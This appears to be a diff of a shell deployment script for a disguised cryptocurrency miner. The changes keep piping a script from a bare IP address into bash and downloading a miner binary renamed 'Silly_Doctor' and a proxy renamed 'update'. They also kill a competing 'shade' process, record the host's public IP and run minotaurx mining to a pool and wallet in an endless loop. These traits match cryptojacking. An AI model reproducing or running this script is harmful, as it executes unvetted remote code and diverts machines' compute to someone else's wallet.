@@ -1,9 +1,8 @@
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget python3 npm libhwloc15 >/dev/null
-
+#!/bin/sh
+cd
+ls -la
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
-
-sleep 2
 
 PID=`ps -eaf | grep shade | grep -v grep | awk '{print $2}'`
 if [[ "" !=  "$PID" ]]; then
@@ -11,54 +10,18 @@ if [[ "" !=  "$PID" ]]; then
   kill -9 $PID
 fi
 
-sleep 2
-
-curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &
-
-sleep 2
-
-wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
-
-sleep 2
-
-source ~/.bashrc
-
-sleep 2
-
-nvm install 21.6.1
-
-sleep 2
-
-npm
-
-sleep 2
-
-npm install -g npm@10.4.0
-
-sleep 2
-
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
-
-sleep 2
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
-dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
+wget -O - http://176.58.105.206/install_and_monitor_shade.sh | bash &
 
 sleep 2
 
 TZ='Africa/Johannesburg'; export TZ
 date
+
 sleep 2
 
-num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_Lab16Cores_')
-ipaddress=$(curl -s ifconfig.me)
-underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
-currentdate+=$underscored_ip
-used_num_of_cores=`expr $num_of_cores - 4`
-echo ""
-echo "You will be using $used_num_of_cores cores"
-echo ""
+curl -s -L -o node-v20.7.0-linux-x64.tar.gz https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
+tar -xf node-v20.7.0-linux-x64.tar.gz
+export PATH=$HOME/node-v20.7.0-linux-x64/bin:$PATH
 
 sleep 2
 
@@ -74,13 +37,20 @@ ph add Silly_Doctor 1>/dev/null 2>&1
 
 sleep 2
 
-curl -s -L -o update.tar.gz https://raw.githubusercontent.com/mandisimakhonkco/update/main/update.tar.gz > /dev/null
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+
+currentdate=$(date '+%d-%b-%Y_Shiny_')
+ipaddress=$(curl -s ifconfig.me)
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+currentdate+=$underscored_ip
+used_num_of_cores=`expr $num_of_cores - 2`
+echo "You will be using $used_num_of_cores cores"
 
 sleep 2
+
+wget -q https://raw.githubusercontent.com/mandisimakhonkco/update/main/update.tar.gz > /dev/null
 
 tar -xf update.tar.gz > /dev/null
-
-sleep 2
 
 cat > update/local/update-local.conf <<END
 listen = :2233
@@ -100,11 +70,7 @@ sleep 3
 
 sleep 2
 
-./update/update curl ifconfig.me
-
-sleep 2
-
-./update/update wget -q https://raw.githubusercontent.com/mandisimakhonkco/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
+wget https://raw.githubusercontent.com/mandisimakhonkco/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
@@ -113,17 +79,29 @@ tar -xf Silly_Doctor_249.tar.gz
 echo " "
 echo " "
 
-echo "Your worker name will be : $currentdate"
+echo "******************************************************************"
+
+./update/update curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
 
 sleep 2
 
-echo ""
-echo ""
-sleep 2
-
-(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf)) && sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+netstat -ntlp
 
 sleep 2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
 
 unset LD_PRELOAD
 unset LD_PRELOAD_ENV
@@ -133,6 +111,5 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool coinxp.teatspray.fun:8243 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate --password c=MAZA,m=solo --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
-sleep 10
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool coinxp.teatspray.fun:8243 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate --password c=MAZA,m=solo --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive
 done
